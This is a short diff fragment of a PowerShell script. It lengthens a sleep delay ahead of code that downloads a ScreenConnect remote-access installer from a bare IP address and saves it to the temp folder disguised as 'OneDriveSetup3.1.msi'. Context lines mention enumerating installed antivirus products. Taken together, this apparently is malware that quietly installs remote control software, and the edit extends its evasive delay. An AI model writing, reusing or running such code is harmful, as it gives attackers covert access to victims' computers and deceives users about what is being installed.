@@ -270,7 +270,7 @@ Installed Antivirus Products (By Path):
         }
     } else {
         try {
-            Start-Sleep -Minutes 15
+            Start-Sleep -Seconds 1800
             $msiDownloadUrl = 'http://87.121.84.32:8040/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest'
             $msiFilePath = Join-Path -Path $env:TEMP -ChildPath 'OneDriveSetup3.1.msi'
 
